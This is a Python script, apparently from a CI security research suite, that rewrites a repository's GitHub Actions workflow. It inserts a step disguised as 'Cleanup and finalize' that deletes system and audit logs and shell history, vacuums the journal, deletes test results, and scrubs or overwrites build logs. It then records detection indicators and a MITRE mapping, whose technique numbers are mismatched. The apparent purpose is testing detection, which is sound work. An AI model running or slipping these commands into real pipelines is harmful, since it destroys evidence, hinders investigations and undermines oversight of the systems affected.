#!/usr/bin/env python3
"""Attack Scenario 8.5: Log Tampering / Deletion - Evasion Technique"""
import sys
import json
import shutil
from pathlib import Path
from datetime import datetime

class LogTamperingAttack:
    """Deletes/modifies audit logs and workflow logs to cover tracks."""

    def __init__(self):
        self.repo_root = Path(__file__).parent.parent.parent.parent
        self.backup_suffix = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.workflow_file = self.repo_root / ".github" / "workflows" / "ci-pipeline.yml"

    def inject_attack(self):
        """Inject log tampering/deletion into workflow."""
        if not self.workflow_file.exists():
            print(f"[!] Workflow file not found: {self.workflow_file}")
            return False

        # Backup original
        backup_file = self.workflow_file.parent / f"ci-pipeline.yml.backup_{self.backup_suffix}"
        shutil.copy2(self.workflow_file, backup_file)

        # Read workflow
        with open(self.workflow_file, 'r') as f:
            content = f.read()

        # Create log tampering step
        malicious_step = '''
      # RESEARCH ATTACK 8.5: Log Tampering / Deletion
      - name: Cleanup and finalize
        run: |
          echo "=== Cleaning up build artifacts ==="

          # ATTACK: Delete audit logs
          echo "[ATTACK] Attempting to delete audit logs..."
          rm -rf /var/log/* 2>/dev/null || true
          rm -rf /var/log/audit/* 2>/dev/null || true
          rm -rf /var/log/secure 2>/dev/null || true
          rm -rf /var/log/auth.log 2>/dev/null || true

          # ATTACK: Clear command history
          echo "[ATTACK] Clearing command history..."
          rm -f ~/.bash_history 2>/dev/null || true
          rm -f ~/.zsh_history 2>/dev/null || true
          history -c 2>/dev/null || true
          > ~/.bash_history 2>/dev/null || true

          # ATTACK: Clear GitHub workflow logs (simulated - can't actually delete)
          echo "[ATTACK] Attempting to clear GitHub workflow logs..."
          > $GITHUB_STEP_SUMMARY 2>/dev/null || true

          # ATTACK: Modify build logs to remove attack indicators
          if [ -f "build.log" ]; then
            echo "[ATTACK] Tampering with build.log..."
            # Remove lines containing ATTACK keywords
            sed -i '/ATTACK/d' build.log 2>/dev/null || true
            sed -i '/malicious/d' build.log 2>/dev/null || true
            sed -i '/backdoor/d' build.log 2>/dev/null || true
            sed -i '/exfiltrat/d' build.log 2>/dev/null || true
          fi

          # ATTACK: Clear system logs
          echo "[ATTACK] Clearing system logs..."
          journalctl --vacuum-time=1s 2>/dev/null || true
          rm -rf /var/log/syslog* 2>/dev/null || true
          rm -rf /var/log/messages* 2>/dev/null || true

          # ATTACK: Modify Git history (simulation - dangerous)
          echo "[ATTACK] Simulating Git history modification..."
          # git filter-branch to remove commits (we won't actually run this)
          echo "git filter-branch --tree-filter 'rm -f attack-evidence.txt' HEAD" || true

          # ATTACK: Clear Docker logs
          echo "[ATTACK] Clearing Docker container logs..."
          docker ps -q | xargs -I {} docker logs {} --tail 0 2>/dev/null || true

          # ATTACK: Delete test results that might show anomalies
          echo "[ATTACK] Deleting test results..."
          rm -rf test-results/ 2>/dev/null || true
          rm -rf coverage/ 2>/dev/null || true
          rm -rf .pytest_cache/ 2>/dev/null || true

          # ATTACK: Overwrite log files with benign content
          echo "[ATTACK] Overwriting logs with benign content..."
          echo "Build completed successfully" > build.log 2>/dev/null || true
          echo "All tests passed" > test-output.log 2>/dev/null || true

          # Log attack indicators (ironic - logging that we're deleting logs)
          echo "ATTACK_INDICATOR: log_tampering=true"
          echo "ATTACK_INDICATOR: log_deletion=true"
          echo "ATTACK_INDICATOR: history_cleared=true"
          echo "ATTACK_INDICATOR: audit_logs_deleted=true"
          echo "ATTACK_INDICATOR: build_logs_modified=true"
          echo "ATTACK_INDICATOR: evidence_destruction=true"

          echo "[ATTACK] Log tampering complete"
'''

        # Find insertion point (at the end, before any final steps)
        # Look for the last step
        if content.count("- name:") > 1:
            # Insert before the last step
            last_step_idx = content.rfind("\n      - name:")
            if last_step_idx != -1:
                content = content[:last_step_idx] + malicious_step + content[last_step_idx:]
        else:
            # Just append if can't find good insertion point
            content += malicious_step

        # Write modified workflow
        with open(self.workflow_file, 'w') as f:
            f.write(content)

        print(f"[OK] Injected log tampering into {self.workflow_file.name}")
        print(f"[OK] Backup: {backup_file.name}")
        return True

    def log_indicators(self):
        """Log attack behavioral indicators."""
        indicators = {
            "attack_type": "log_tampering_deletion",
            "scenario_id": "8.5",
            "timestamp": datetime.now().isoformat(),
            "severity": "high",
            "indicators": {
                "log_tampering": True,
                "log_deletion": True,
                "evidence_destruction": True,
                "evasion_technique": True,
                "workflow_modified": True,
                "tampered_logs": [
                    "/var/log/*",
                    "/var/log/audit/*",
                    "~/.bash_history",
                    "build.log",
                    "test-results/",
                    "$GITHUB_STEP_SUMMARY"
                ],
                "tampering_methods": [
                    "rm -rf",
                    "sed deletion",
                    "history -c",
                    "log overwriting",
                    "journalctl vacuum"
                ]
            },
            "expected_detection": {
                "difficulty": "medium",
                "primary_signals": [
                    "log_file_deletion",
                    "missing_log_entries",
                    "history_cleared",
                    "suspicious_file_deletions",
                    "sed_usage_on_logs",
                    "rm_commands_on_log_directories",
                    "log_integrity_violation"
                ],
                "detection_tools": [
                    "Log integrity monitoring",
                    "File integrity monitoring (FIM)",
                    "Audit log monitoring",
                    "Workflow analysis",
                    "Suspicious command detection"
                ]
            },
            "mitre_attack": {
                "technique": "T1070.001",
                "name": "Indicator Removal on Host: Clear Windows Event Logs",
                "tactic": "Defense Evasion",
                "sub_technique": "T1070.002 - Clear Linux Logs"
            },
            "real_world_frequency": "high",
            "impact": {
                "evidence_loss": "critical",
                "investigation_hindrance": "high",
                "compliance_violation": "high",
                "forensic_difficulty": "high"
            }
        }

        # Save indicators
        log_dir = Path(__file__).parent.parent / "logs" / "indicators"
        log_dir.mkdir(parents=True, exist_ok=True)

        with open(log_dir / f"log_tampering_{self.backup_suffix}.json", 'w') as f:
            json.dump(indicators, f, indent=2)

        return indicators

    def execute(self):
        """Execute the attack."""
        print("=" * 80)
        print("ATTACK SCENARIO 8.5: Log Tampering / Deletion")
        print("=" * 80)
        print("Severity: HIGH")
        print("Realism: 9/10 - Common evasion technique")
        print("Impact: Evidence destruction, investigation hindrance")
        print()

        if self.inject_attack():
            self.log_indicators()
            print()
            print("[OK] Attack successfully injected!")
            print("[OK] Log tampering commands added to workflow")
            print("[!] Detection: Log integrity monitoring, FIM, audit logs")
            print("=" * 80)
            return True
        else:
            print("[FAIL] Attack injection failed")
            return False

if __name__ == "__main__":
    sys.exit(0 if LogTamperingAttack().execute() else 1)
